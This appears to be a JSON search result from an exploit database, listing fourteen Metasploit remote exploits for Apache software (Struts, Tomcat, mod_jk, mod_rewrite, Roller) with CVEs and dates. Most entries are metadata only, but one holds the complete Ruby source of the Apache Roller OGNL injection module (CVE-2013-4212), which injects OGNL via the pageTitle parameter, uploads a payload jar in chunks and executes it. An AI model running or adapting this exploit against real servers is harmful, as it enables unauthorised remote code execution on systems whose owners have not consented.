{
  "matches": [
    {
      "code": null,
      "description": "Apache Struts < 2.2.0 - Remote Command Execution",
      "author": "metasploit",
      "_id": 17691,
      "source": "ExploitDB",
      "platform": "multiple",
      "date": "2011-08-19T00:00:00+00:00",
      "cve": [
        "2010-1870"
      ],
      "type": "remote",
      "port": 0
    },
    {
      "code": null,
      "description": "Apache Win32 Chunked Encoding",
      "author": "metasploit",
      "_id": 16782,
      "source": "ExploitDB",
      "platform": "windows",
      "date": "2010-07-07T00:00:00+00:00",
      "cve": [
        "2002-0392"
      ],
      "type": "remote",
      "port": 0
    },
    {
      "code": null,
      "description": "Apache Struts ParametersInterceptor Remote Code Execution",
      "author": "metasploit",
      "_id": 24874,
      "source": "ExploitDB",
      "platform": "multiple",
      "date": "2013-03-22T00:00:00+00:00",
      "cve": [
        "2011-3923"
      ],
      "type": "remote",
      "port": 0
    },
    {
      "code": null,
      "description": "Apache Struts - includeParams Remote Code Execution",
      "author": "metasploit",
      "_id": 25980,
      "source": "ExploitDB",
      "platform": "multiple",
      "date": "2013-06-05T00:00:00+00:00",
      "cve": [
        "2013-1966"
      ],
      "type": "remote",
      "port": 8080
    },
    {
      "code": null,
      "description": "Apache Struts Developer Mode OGNL Execution",
      "author": "metasploit",
      "_id": 31434,
      "source": "ExploitDB",
      "platform": "java",
      "date": "2014-02-05T00:00:00+00:00",
      "cve": [
        "2012-0394"
      ],
      "type": "remote",
      "port": 8080
    },
    {
      "code": null,
      "description": "Apache mod_jk 1.2.20 - Buffer Overflow",
      "author": "metasploit",
      "_id": 16798,
      "source": "ExploitDB",
      "platform": "windows",
      "date": "2010-07-25T00:00:00+00:00",
      "cve": [
        "2007-0774"
      ],
      "type": "remote",
      "port": 0
    },
    {
      "code": null,
      "description": "Apache Struts <= 2.2.1.1 - Remote Command Execution",
      "author": "metasploit",
      "_id": 18984,
      "source": "ExploitDB",
      "platform": "multiple",
      "date": "2012-06-05T00:00:00+00:00",
      "cve": [
        "2012-0391"
      ],
      "type": "remote",
      "port": 0
    },
    {
      "code": null,
      "description": "Apache Roller OGNL Injection",
      "author": "metasploit",
      "_id": 29859,
      "source": "ExploitDB",
      "platform": "java",
      "date": "2013-11-27T00:00:00+00:00",
      "cve": [
        "2013-4212"
      ],
      "type": "remote",
      "port": 8080
    },
    {
      "code": null,
      "description": "Apache Struts ClassLoader Manipulation Remote Code Execution",
      "author": "metasploit",
      "_id": 33142,
      "source": "ExploitDB",
      "platform": "multiple",
      "date": "2014-05-02T00:00:00+00:00",
      "cve": [
        "2014-0113"
      ],
      "type": "remote",
      "port": 8080
    },
    {
      "code": null,
      "description": "Apache module mod_rewrite LDAP protocol Buffer Overflow",
      "author": "metasploit",
      "_id": 16752,
      "source": "ExploitDB",
      "platform": "windows",
      "date": "2010-02-15T00:00:00+00:00",
      "cve": [
        "2006-3747"
      ],
      "type": "remote",
      "port": 80
    },
    {
      "code": null,
      "description": "Oracle Weblogic Apache Connector POST Request Buffer Overflow",
      "author": "metasploit",
      "_id": 18897,
      "source": "ExploitDB",
      "platform": "windows",
      "date": "2012-05-19T00:00:00+00:00",
      "cve": [
        "2008-3257"
      ],
      "type": "remote",
      "port": 0
    },
    {
      "code": null,
      "description": "Apache Tomcat Manager - Application Upload Authenticated Code Execution",
      "author": "metasploit",
      "_id": 31433,
      "source": "ExploitDB",
      "platform": "multiple",
      "date": "2014-02-05T00:00:00+00:00",
      "cve": [
        "2009-3548"
      ],
      "type": "remote",
      "port": 80
    },
    {
      "code": null,
      "description": "Apache Struts 2 DefaultActionMapper Prefixes OGNL Code Execution",
      "author": "metasploit",
      "_id": 27135,
      "source": "ExploitDB",
      "platform": "multiple",
      "date": "2013-07-27T00:00:00+00:00",
      "cve": [
        "2013-2251"
      ],
      "type": "remote",
      "port": 8080
    },
    {
      "code": null,
      "description": "Apache Tomcat Manager Application Deployer Authenticated Code Execution",
      "author": "metasploit",
      "_id": 16317,
      "source": "ExploitDB",
      "platform": "multiple",
      "date": "2010-12-14T00:00:00+00:00",
      "cve": [
        "2009-3548"
      ],
      "type": "remote",
      "port": 0
    },
    {
      "code": "##\n# This module requires Metasploit: http://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'msf/core'\n\nclass Metasploit3 < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache Roller OGNL Injection',\n      'Description'    => %q{\n        This module exploits an OGNL injection vulnerability in Apache Roller < 5.0.2. The\n        vulnerability is due to an OGNL injection on the UIAction controller because of an\n        insecure usage of the ActionSupport.getText method. This module has been tested\n        successfully on Apache Roller 5.0.1 on Ubuntu 10.04.\n      },\n      'Author'         =>\n        [\n          'Unknown', # From coverity.com / Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2013-4212'],\n          [ 'URL', 'http://security.coverity.com/advisory/2013/Oct/remote-code-execution-in-apache-roller-via-ognl-injection.html']\n        ],\n      'Platform'      => 'java',\n      'Arch'          => ARCH_JAVA,\n      'Privileged'     => true,\n      'Targets'        =>\n        [\n          [ 'Apache Roller 5.0.1', { } ]\n        ],\n      'DisclosureDate' => 'Oct 31 2013',\n      'DefaultTarget' => 0))\n\n      register_options(\n        [\n          Opt::RPORT(8080),\n          OptString.new('TARGETURI', [ true, 'The path to the Apache Roller application.', \"/roller\"])\n        ], self.class)\n  end\n\n  def execute_command(cmd)\n    injection = \"%24{(%23_memberAccess[\"allowStaticMethodAccess\"]%3dtrue,CMD,'')}\"\n    injection.gsub!(/CMD/, Rex::Text::uri_encode(cmd))\n\n    vprint_status(\"Attempting to execute: #{cmd}\")\n\n    res = send_request_cgi({\n      'method'  => 'GET',\n      'uri'     => normalize_uri(target_uri.path.to_s, \"roller-ui\", \"login.rol\"),\n      'encode_params' => false,\n      'vars_get' =>\n      {\n        'pageTitle' => injection\n      }\n    })\n  end\n\n  def java_upload_part(part, filename, append = 'false')\n    cmd = \"#f=new java.io.FileOutputStream('#{filename}'+#a,#{append}),\"\n    cmd << \"#f.write(new sun.misc.BASE64Decoder().decodeBuffer('#{Rex::Text.encode_base64(part)}')),\"\n    cmd << \"#f.close(),#a='#{@random_suffix}'\"\n    execute_command(cmd)\n  end\n\n  def exploit\n\n    print_status(\"Checking injection...\")\n\n    if check == Exploit::CheckCode::Vulnerable\n      print_good(\"Target looks vulnerable, exploiting...\")\n    else\n      print_warning(\"Target not found as vulnerable, trying anyway...\")\n    end\n\n    @random_suffix = rand_text_alphanumeric(3) # To avoid duplicate execution\n    @payload_exe = rand_text_alphanumeric(4+rand(4)) + \".jar\"\n    append = 'false'\n    jar = payload.encoded_jar.pack\n\n    File.open(\"/tmp/#{@payload_exe}\", \"wb\") do |f| f.write(jar) end\n\n    chunk_length = 384 # 512 bytes when base64 encoded\n\n    parts = jar.chars.each_slice(chunk_length).map(&:join)\n    parts.each do |part|\n      java_upload_part(part, @payload_exe, append)\n      append = 'true'\n    end\n\n    register_files_for_cleanup(\"#{@payload_exe}null\", \"#{@payload_exe}#{@random_suffix}\")\n\n    cmd = \"\"\n    # disable Vararg handling (since it is buggy in OGNL used by Struts 2.1\n    cmd << \"#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdkChecked'),\"\n    cmd << \"#q.setAccessible(true),#q.set(null,true),\"\n    cmd << \"#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdk15'),\"\n    cmd << \"#q.setAccessible(true),#q.set(null,false),\"\n    # create classloader\n    cmd << \"#cl=new java.net.URLClassLoader(new java.net.URL[]{new java.io.File('#{@payload_exe}'+#a).toURI().toURL()}),#a='#{rand_text_alphanumeric(4)}',\"\n    # load class\n    cmd << \"#c=#cl.loadClass('metasploit.Payload'),\"\n    # invoke main method\n    cmd << \"#c.getMethod('main',new java.lang.Class[]{@java.lang.Class@forName('[Ljava.lang.String;')}).invoke(\"\n    cmd << \"null,new java.lang.Object[]{new java.lang.String[0]})\"\n    execute_command(cmd)\n  end\n\n  def check\n    addend_one = rand_text_numeric(rand(3) + 1).to_i\n    addend_two = rand_text_numeric(rand(3) + 1).to_i\n    sum = addend_one + addend_two\n\n    res = send_request_cgi({\n      'method'  => 'GET',\n      'uri'     => normalize_uri(target_uri.path.to_s, \"roller-ui\", \"login.rol\"),\n      'vars_get' =>\n        {\n          'pageTitle' => \"${new java.lang.Integer(#{addend_one}+#{addend_two})}\",\n        }\n    })\n\n    if res and res.code == 200 and res.body =~ /#{sum}/\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\nend\n",
      "description": "This module exploits an OGNL injection vulnerability in Apache Roller < 5.0.2. The\n        vulnerability is due to an OGNL injection on the UIAction controller because of an\n        insecure usage of the ActionSupport.getText method. This module has been tested\n        successfully on Apache Roller 5.0.1 on Ubuntu 10.04.",
      "bid": [],
      "rank": "excellent",
      "alias": null,
      "arch": "[\"java\"]",
      "_id": "exploit/multi/http/apache_roller_ognl_injection",
      "osvdb": [],
      "author": [
        "Unknown",
        "juan vazquez <juan.vazquez@metasploit.com>"
      ],
      "msb": [],
      "platform": [
        "Java"
      ],
      "version": "0",
      "source": "Metasploit",
      "title": "Apache Roller OGNL Injection",
      "cve": [
        "CVE-2013-4212"
      ],
      "type": "exploit",
      "privileged": true
    }
  ],
  "facets": {
    "type": [
      {
        "count": 14,
        "value": "remote"
      }
    ],
    "author": [
      {
        "count": 14,
        "value": "metasploit"
      }
    ]
  },
  "total": 14
}